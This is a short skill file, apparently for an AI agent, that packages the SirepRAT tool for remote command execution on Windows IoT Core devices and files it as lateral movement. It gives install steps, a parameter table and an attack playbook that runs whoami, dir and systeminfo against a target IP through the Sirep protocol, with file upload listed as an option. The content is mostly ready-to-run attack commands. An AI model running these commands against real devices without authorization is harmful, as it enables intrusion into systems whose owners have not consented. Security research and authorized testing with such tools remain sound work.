---
name: sireprat-windows-iot
description: "SirepRAT: Windows IoT device RCE. Signals: lateral movement, psexec, upload."
zh-signals: "SirepRAT: Windows IoT 设备 RCE。信号:横向移动,psexec,上传。"
---

# SirepRAT

- 攻击大类:C31 远程服务横向移动
- 上游仓库:https://github.com/SafeBreach-Labs/SirepRAT
- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/SafeBreach-Labs/SirepRAT && cd SirepRAT && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python SirepRAT.py 10.0.0.5 LaunchCommandWithOutput -c 'cmd /c whoami'` | Windows IoT RCE |
| `-c 'cmd /c dir'` | 命令 |
| `-f file` | 上传 |

## 攻击场景 Playbook

### Windows IoT 设备 RCE

```bash
python SirepRAT.py 10.0.0.5 LaunchCommandWithOutput -c 'cmd /c systeminfo'
# Sirep 协议 RCE
```

## 注意事项

SafeBreach 出品,Windows IoT Core RCE。
